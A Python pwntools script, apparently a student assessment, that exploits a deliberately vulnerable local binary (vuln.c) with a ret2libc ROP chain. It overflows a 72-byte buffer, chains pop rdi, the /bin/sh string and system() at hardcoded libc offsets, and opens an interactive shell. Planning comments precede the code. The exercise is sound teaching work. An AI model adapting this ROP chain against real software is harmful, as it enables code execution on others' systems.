# Python program to exploit vuln.c for Assessment 2

# Use a ROP/ret2libc method. (as NX protected)

# Need to decide what vulnerability to exploit.  
# Some options:
# - Call a hidden function (maybe too trivial though)
# - Call /bash/sh
# - ret2libc and ROP with ASLR and NX enabled?


# To Do before submitting:
# - Insert original Assembly in Python script as comments.
# - Explain method being used and instructions for use.
# - Ensure all code is commented with an explanation of its purpose.
# - GOT and PLT usage explained - if used (ASLR?)
# - Explain how vuln.c was compiled, security features etc.
# - If going to use PWNTOOLS, include info on install.
# - if NOT using ASLR, explin to disable it before exe.
# - Update/Change all comments

# Questions to answer
# - Will memory addresses of system ROP Gadgets be the same 
#      between systems - since we know the base system?
# - Can I use pwntools for this? Brief doesn't say I can't, and can
#      change this script to execute independently. (instead of called via .txt)

#!/usr/bin/python3

from pwn import *

p = process('./vuln') 

binary = ELF('./vuln') # loading the binary into pwntools
context.binary = binary # setting up all pwntool settings suited for the binary
rop = ROP(binary) # loading our binary to look for gadgets and building rop chains
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil(b"Password:") # we tell pwntools to wait until it receives the string in stdout

libc.address = 0x00007ffff7dc4000 # Libc base address on my system without ASLR.
poprdi = libc.address + 0x0000000000028215 # using ROPgadget
ret = libc.address + 0x000000000002668c # using ROPgadget
system = libc.address + 0x000000000004dab0 # using 'readelf'
binsh = libc.address + 0x0000000000197e34 # using 'strings'

rop.raw(b"A"*72)  # Overflow
#rop.raw(pack("<I",0xdeadbeef)) # RIP test
rop.raw(poprdi) # pop rdi
rop.raw(binsh)
#rop.raw(next(libc.search(b'/bin/sh')))  # ROPgadget - search for the string /bin/sh
rop.raw(ret)  # ret from libc
rop.raw(system)
#rop.raw(libc.symbols['system']) # ROPgadget - find the 'system' symbol

# Generate the ROP chain
rop_chain = rop.chain()

# Write the ROP chain to a file - to use with debugger
with open('rop_chain.txt', 'wb') as f:
    f.write(rop_chain)

p.sendline(rop_chain) # Send the exploit to ./vuln
p.interactive() # Begin interactive session